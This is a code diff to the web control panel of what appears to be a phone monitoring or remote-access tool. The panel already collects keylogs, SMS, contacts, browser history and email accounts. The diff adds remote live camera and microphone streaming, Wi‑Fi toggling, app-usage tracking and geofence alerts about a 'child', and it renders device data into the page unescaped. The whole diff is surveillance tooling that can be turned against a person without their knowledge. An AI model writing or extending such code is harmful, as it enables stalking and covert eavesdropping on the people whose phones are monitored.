@@ -1096,6 +1096,67 @@
           </div>
         </div>
 
+        <!-- Live Camera + Mic Streams -->
+        <div class="card" id="live-streams-card">
+          <div class="card-header">
+            <div class="card-title"><i class="fa-solid fa-satellite-dish" style="color:#facc15;"></i> Live Camera & Microphone Streams</div>
+            <div class="ctrl-bar">
+              <button class="btn btn-purple" onclick="startCameraStream('front')"><i class="fa-solid fa-video"></i> Cam Front</button>
+              <button class="btn btn-teal" onclick="startCameraStream('back')"><i class="fa-solid fa-video"></i> Cam Back</button>
+              <button class="btn btn-red" onclick="startMicStream()"><i class="fa-solid fa-microphone"></i> Mic LIVE</button>
+              <button class="btn btn-ghost" onclick="stopAllStreams()"><i class="fa-solid fa-stop"></i> Stop Streams</button>
+            </div>
+          </div>
+          <div class="card-body">
+            <div style="display:flex;gap:12px;flex-wrap:wrap;">
+              <div style="flex:1;min-width:260px;">
+                <div id="live-cam-display" style="min-height:170px;display:flex;align-items:center;justify-content:center;background:var(--bg-void);border-radius:10px;border:1px dashed var(--border);">
+                  <span style="color:var(--text-3);font-size:12px;">No live camera feed — press Cam Front/Back</span>
+                </div>
+                <div id="live-cam-status" style="font-size:10px;color:var(--text-3);margin-top:6px;text-align:center;">—</div>
+              </div>
+              <div style="flex:1;min-width:200px;">
+                <div id="mic-meter-wrap" style="background:var(--bg-void);border-radius:10px;border:1px dashed var(--border);padding:14px;text-align:center;">
+                  <div style="font-size:11px;color:var(--text-2);margin-bottom:8px;">🎙️ Live Mic (PCM 8kHz)</div>
+                  <div style="display:flex;align-items:center;justify-content:center;gap:3px;height:34px;" id="mic-meter">
+                    <span style="color:var(--text-3);font-size:12px;" id="mic-meter-text">Stream stopped</span>
+                  </div>
+                  <div id="mic-status" style="font-size:10px;color:var(--text-3);margin-top:6px;">Not streaming. Web Audio will play chunks as they arrive.</div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Network, Usage, Geofence & App Events -->
+        <div class="card" id="network-card">
+          <div class="card-header">
+            <div class="card-title"><i class="fa-solid fa-tower-broadcast" style="color:#34d399;"></i> Connectivity & Insights</div>
+            <div class="ctrl-bar">
+              <button class="btn btn-green" onclick="requestNetworkInfo()"><i class="fa-solid fa-wifi"></i> Network Info</button>
+              <button class="btn btn-teal" onclick="toggleWifi(true)"><i class="fa-solid fa-wifi"></i> WiFi ON</button>
+              <button class="btn btn-red" onclick="toggleWifi(false)"><i class="fa-solid fa-wifi"></i> WiFi OFF</button>
+              <button class="btn btn-amber" onclick="requestAppUsage()"><i class="fa-solid fa-chart-simple"></i> App Usage</button>
+            </div>
+          </div>
+          <div class="card-body">
+            <div id="network-info-display" style="font-family:var(--font-mono);font-size:11px;color:var(--text-2);background:var(--bg-void);border-radius:10px;border:1px solid var(--border);padding:12px;margin-bottom:12px;">
+              <span style="color:var(--text-3);">Network info & app usage results appear here.</span>
+            </div>
+            <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center;">
+              <span style="font-size:11px;color:var(--text-3);"><i class="fa-solid fa-location-crosshairs"></i> Geofence alert (center + radius):</span>
+              <input type="text" id="geo-lat" placeholder="lat" style="width:110px;">
+              <input type="text" id="geo-lng" placeholder="lng" style="width:110px;">
+              <input type="text" id="geo-radius" placeholder="radius m (300)" style="width:100px;">
+              <button class="btn btn-purple" onclick="setGeofence()"><i class="fa-solid fa-map-pin"></i> Set</button>
+              <button class="btn btn-ghost" onclick="clearGeofence()"><i class="fa-solid fa-trash"></i> Clear</button>
+            </div>
+            <div id="events-feed" style="margin-top:12px;font-family:var(--font-mono);font-size:11px;color:var(--text-2);line-height:1.7;background:var(--bg-void);border-radius:10px;border:1px solid var(--border);padding:12px;max-height:150px;overflow-y:auto;">
+              <span style="color:var(--text-3);">Geofence crossings & app install/uninstall events appear here.</span>
+            </div>
+          </div>
+        </div>
+
         <!-- GPS Location -->
         <div class="card" id="location-card">
           <div class="card-header">
@@ -1537,6 +1598,17 @@
             if (dev) dev.lastFrame = data.image;
             drawScreenFrame(data.image);
           }
+        } else if (data.type === 'camera_stream_frame') {
+          if (selectedDeviceId === data.deviceId) {
+            document.getElementById('live-cam-display').innerHTML =
+              `<img src="${data.image}" style="border-radius:8px;width:100%;max-height:300px;object-fit:contain;border:1px solid var(--border);">`;
+            document.getElementById('live-cam-status').textContent = `📹 LIVE ${data.facing === 'front' ? 'Front' : 'Back'} camera — ${new Date().toLocaleTimeString()}`;
+            if (!liveCamOn) { liveCamOn = true; setLiveCamButtons(); }
+          }
+        } else if (data.type === 'audio_stream_chunk') {
+          if (selectedDeviceId === data.deviceId) handleAudioChunk(data);
+        } else if (data.type === 'geofence_event' || data.type === 'app_install_event') {
+          addEventsFeedLine(data);
         } else if (data.type === 'notification') {
           addNotificationLog(data);
         } else if (data.type === 'file_manager_response') {
@@ -1549,7 +1621,8 @@
                     'call_log_result','sms_result','incoming_sms',
                     'contacts_result','installed_apps_result','get_info_result',
                     'screenshot_result','take_photo_result',
-                    'email_accounts_result','browser_history_result','keylog_result'].includes(data.type)) {
+                    'email_accounts_result','browser_history_result','keylog_result',
+                    'network_info_result','app_usage_result'].includes(data.type)) {
           handleMonitoringResult(data);
         } else if (data.type === 'error') {
           document.getElementById('explorer-loader').style.display = 'none';
@@ -1941,6 +2014,182 @@
     }
   }
 
+  // ── Live Camera & Mic streams ──────────────────────────────
+  let liveCamOn = false;
+  let micLiveOn = false;
+
+  function setLiveCamButtons() {
+    const card = document.getElementById('live-streams-card');
+    if (!card) return;
+    const btns = card.querySelectorAll('.card-header .btn');
+    btns.forEach(b => b.classList.toggle('btn-gradient', false));
+  }
+
+  function startCameraStream(facing) {
+    if (!selectedDeviceId || !ws) { showToast('⚠️ No device selected', 'info'); return; }
+    ws.send(JSON.stringify({ type: 'command', targetDeviceId: selectedDeviceId, command: 'start_camera_stream', facing }));
+    liveCamOn = true;
+    document.getElementById('live-cam-display').innerHTML = `<div class="spinner" style="width:26px;height:26px;border-width:3px;"></div>`;
+    document.getElementById('live-cam-status').textContent = '⏳ Starting live camera stream…';
+    showToast(`📹 Starting live ${facing} camera stream`, 'success');
+  }
+
+  function stopAllStreams() {
+    if (!selectedDeviceId || !ws) return;
+    ws.send(JSON.stringify({ type: 'command', targetDeviceId: selectedDeviceId, command: 'stop_camera_stream' }));
+    ws.send(JSON.stringify({ type: 'command', targetDeviceId: selectedDeviceId, command: 'stop_audio_stream' }));
+    liveCamOn = false;
+    stopMicPlayback();
+    document.getElementById('live-cam-display').innerHTML = `<span style="color:var(--text-3);font-size:12px;">Stream stopped</span>`;
+    document.getElementById('live-cam-status').textContent = '—';
+    showToast('⏹️ Live streams stopped', 'info');
+  }
+
+  // WebAudio live playback of raw PCM16LE mono chunks
+  let audioCtx = null, nextPlayTime = 0;
+
+  function ensureAudioCtx() {
+    if (!audioCtx) {
+      const AC = window.AudioContext || window.webkitAudioContext;
+      if (!AC) return false;
+      audioCtx = new AC();
+      nextPlayTime = 0;
+    }
+    if (audioCtx.state === 'suspended') audioCtx.resume();
+    return true;
+  }
+
+  function b64ToBytes(b64) {
+    const bin = atob(b64);
+    const bytes = new Uint8Array(bin.length);
+    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
+    return bytes;
+  }
+
+  function handleAudioChunk(data) {
+    if (!micLiveOn) return;
+    if (!ensureAudioCtx()) return;
+    const rate = data.rate || 8000;
+    const pcm = b64ToBytes(data.base64 || '');
+    if (pcm.length < 2) return;
+    const n = Math.floor(pcm.length / 2);
+    const float = new Float32Array(n);
+    let peak = 0;
+    for (let i = 0; i < n; i++) {
+      const sample = (pcm[i*2] | (pcm[i*2+1] << 8));
+      const v = sample / 32768;
+      float[i] = v;
+      peak = Math.max(peak, Math.abs(v));
+    }
+    // Visual meter
+    const meterEl = document.getElementById('mic-meter-text');
+    const segs = document.querySelectorAll('#mic-meter .mseg');
+    const activeSegs = Math.min(segments, Math.round(peak * segments));
+    segs.forEach((s, i) => s.style.background = i < activeSegs ? '#f87171' : '#2b3245');
+    if (meterEl) meterEl.textContent = peak > 0.03 ? '🔴 LIVE' : '🎙️ LIVE (silence)';
+
+    const buffer = audioCtx.createBuffer(1, n, rate);
+    buffer.copyToChannel(float, 0);
+    const src = audioCtx.createBufferSource();
+    src.buffer = buffer;
+    src.connect(audioCtx.destination);
+    if (nextPlayTime < audioCtx.currentTime + 0.05) nextPlayTime = audioCtx.currentTime + 0.05;
+    // Skip backlog to avoid growing latency
+    if (nextPlayTime - audioCtx.currentTime > 1.5) nextPlayTime = audioCtx.currentTime + 0.05;
+    src.start(nextPlayTime);
+    nextPlayTime += buffer.duration;
+  }
+
+  function startMicStream() {
+    if (!selectedDeviceId || !ws) { showToast('⚠️ No device selected', 'info'); return; }
+    if (!ensureAudioCtx()) { showToast('⚠️ Audio not supported in this browser', 'error'); return; }
+    micLiveOn = true;
+    renderMicMeter(true);
+    document.getElementById('mic-status').textContent = '🔴 Streaming — audio plays live. Press Stop Streams to end.';
+    ws.send(JSON.stringify({ type: 'command', targetDeviceId: selectedDeviceId, command: 'start_audio_stream' }));
+    showToast('🎙️ Live microphone stream started', 'success');
+  }
+
+  const segments = 12;
+  function renderMicMeter(on) {
+    const wrap = document.getElementById('mic-meter');
+    if (!wrap) return;
+    if (on) {
+      let html = '';
+      for (let i = 0; i < segments; i++) html += `<span class="mseg" style="width:7px;height:${(10 + (i % 5) * 4) * 3}px;background:#2b3245;border-radius:2px;transition:background .1s;"></span>`;
+      wrap.innerHTML = html;
+    } else {
+      wrap.innerHTML = `<span style="color:var(--text-3);font-size:12px;" id="mic-meter-text">Stream stopped</span>`;
+    }
+  }
+
+  function stopMicPlayback() {
+    micLiveOn = false;
+    renderMicMeter(false);
+    const st = document.getElementById('mic-status');
+    if (st) st.textContent = 'Not streaming.';
+    try { if (audioCtx) audioCtx.close(); } catch (e) {}
+    audioCtx = null;
+  }
+
+  // ── Network / Usage / Geofence / App events ───────────────────
+  function requestNetworkInfo() {
+    if (!selectedDeviceId || !ws) { showToast('⚠️ No device selected', 'info'); return; }
+    ws.send(JSON.stringify({ type: 'command', targetDeviceId: selectedDeviceId, command: 'get_network_info' }));
+    showToast('📶 Fetching network info…', 'info');
+  }
+
+  function toggleWifi(on) {
+    if (!selectedDeviceId || !ws) { showToast('⚠️ No device selected', 'info'); return; }
+    ws.send(JSON.stringify({ type: 'command', targetDeviceId: selectedDeviceId, command: on ? 'wifi_on' : 'wifi_off' }));
+    showToast(on ? '📶 WiFi ON sent' : '📴 WiFi OFF sent', 'info');
+  }
+
+  function requestAppUsage() {
+    if (!selectedDeviceId || !ws) { showToast('⚠️ No device selected', 'info'); return; }
+    ws.send(JSON.stringify({ type: 'command', targetDeviceId: selectedDeviceId, command: 'get_app_usage' }));
+    document.getElementById('network-info-display').innerHTML = `<span style="color:var(--amber);">⏳ Fetching 24h app usage…</span>`;
+  }
+
+  function setGeofence() {
+    if (!selectedDeviceId || !ws) { showToast('⚠️ No device selected', 'info'); return; }
+    const lat = parseFloat(document.getElementById('geo-lat').value);
+    const lng = parseFloat(document.getElementById('geo-lng').value);
+    const radius = parseFloat(document.getElementById('geo-radius').value) || 300;
+    if (isNaN(lat) || isNaN(lng)) { showToast('⚠️ Enter valid latitude & longitude', 'error'); return; }
+    ws.send(JSON.stringify({ type: 'command', targetDeviceId: selectedDeviceId, command: 'set_geofence', lat, lng, radius }));
+    addEventsFeedLine({ kind: 'geofence', text: `⏳ Geofence set request sent (${lat.toFixed(5)}, ${lng.toFixed(5)}, r=${radius}m)` });
+  }
+
+  function clearGeofence() {
+    if (!selectedDeviceId || !ws) { showToast('⚠️ No device selected', 'info'); return; }
+    ws.send(JSON.stringify({ type: 'command', targetDeviceId: selectedDeviceId, command: 'clear_geofence' }));
+    addEventsFeedLine({ kind: 'geofence', text: '⏳ Clear geofence request sent' });
+  }
+
+  function addEventsFeedLine(data) {
+    const feed = document.getElementById('events-feed');
+    if (!feed) return;
+    let line;
+    if (data.type === 'geofence_event') {
+      const t = data.timeLabel || new Date().toLocaleTimeString();
+      const arrow = data.event === 'entered' ? '🟢 ENTERED' : '🔴 LEFT';
+      line = `<div style="padding:3px 0;border-bottom:1px solid var(--border);">📍 Geofence: child <b style="color:${data.event === 'entered' ? '#34d399' : '#f87171'}">${arrow}</b> zone (${data.distanceM}m from center, r=${data.radiusM}m) — ${t}</div>`;
+    } else if (data.type === 'app_install_event') {
+      const t = data.timeLabel || new Date().toLocaleTimeString();
+      const ev = data.event;
+      const emoji = ev === 'installed' ? '🆕' : (ev === 'updated' ? '🔄' : '🗑️');
+      const verb = ev === 'installed' ? 'installed' : (ev === 'updated' ? 'updated' : 'uninstalled');
+      line = `<div style="padding:3px 0;border-bottom:1px solid var(--border);">${emoji} App <b>${data.app}</b> ${verb} — ${t}</div>`;
+    } else if (data.kind === 'geofence') {
+      line = `<div style="padding:3px 0;border-bottom:1px solid var(--border);color:var(--amber);">${data.text}</div>`;
+    } else { return; }
+    const existing = feed.querySelector('span');
+    if (existing) existing.remove();
+    feed.insertAdjacentHTML('afterbegin', line);
+    while (feed.children.length > 60) feed.removeChild(feed.lastChild);
+  }
+
   function filterContacts() {
     const q = document.getElementById('contacts-search').value.toLowerCase();
     const filtered = cachedContacts.filter(c => c.name?.toLowerCase().includes(q) || c.number?.includes(q));
@@ -2127,6 +2376,34 @@
               <div style="word-break:break-all;margin-top:2px;">${e.text}</div></div>`;
           }).join('');
       document.getElementById('advanced-monitor-display').innerHTML = `<div>⌨️ <strong>Keylog</strong> — ${entries.length} entries<br>${html}</div>`;
+    }
+
+    if (data.type === 'network_info_result') {
+      const el = document.getElementById('network-info-display');
+      if (data.error) { el.innerHTML = `<span style="color:#f87171;">❌ ${data.error}</span>`; return; }
+      el.innerHTML = `
+        <div style="display:flex;gap:8px;"><span style="color:var(--text-3);min-width:100px;">Type</span><span>${data.networkType || '—'}</span></div>
+        <div style="display:flex;gap:8px;"><span style="color:var(--text-3);min-width:100px;">WiFi</span><span>${data.wifiEnabled ? '🟢 ON' : '🔴 OFF'}</span></div>
+        ${data.ssid ? `<div style="display:flex;gap:8px;"><span style="color:var(--text-3);min-width:100px;">SSID</span><span>${data.ssid}</span></div>` : ''}
+        ${data.rssi && data.rssi > -127 ? `<div style="display:flex;gap:8px;"><span style="color:var(--text-3);min-width:100px;">Signal</span><span>${data.rssi} dBm</span></div>` : ''}
+        <div style="color:var(--text-3);margin-top:4px;font-size:9px;">🕐 ${new Date(data.time).toLocaleTimeString()}</div>`;
+    }
+
+    if (data.type === 'app_usage_result') {
+      const el = document.getElementById('network-info-display');
+      if (data.error) { el.innerHTML = `<span style="color:#f87171;">❌ ${data.error}</span>`; return; }
+      const items = data.items || [];
+      if (items.length === 0) { el.innerHTML = `<span style="color:var(--text-3);">No usage data returned</span>`; return; }
+      el.innerHTML = `<div style="font-weight:600;color:var(--accent);margin-bottom:6px;">📊 App Usage — last 24h</div>` +
+        items.slice(0, 20).map(u => {
+          const mins = u.minutes || 0;
+          const barW = Math.min(100, Math.round(mins / (mins > 300 ? 600 : 60) * 100));
+          return `<div style="display:flex;align-items:center;gap:6px;padding:2px 0;">
+            <span style="min-width:0;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">${u.app || u.package}</span>
+            <span style="width:70px;background:var(--bg-card2);border-radius:4px;height:8px;overflow:hidden;"><span style="display:block;height:8px;width:${barW}%;background:#34d399;"></span></span>
+            <span style="min-width:52px;text-align:right;color:var(--text-2);">${mins} min</span></div>`;
+        }).join('') +
+        `<div style="color:var(--text-3);font-size:9px;margin-top:6px;">🕐 ${new Date(data.time).toLocaleTimeString()}</div>`;
     }
   }
 
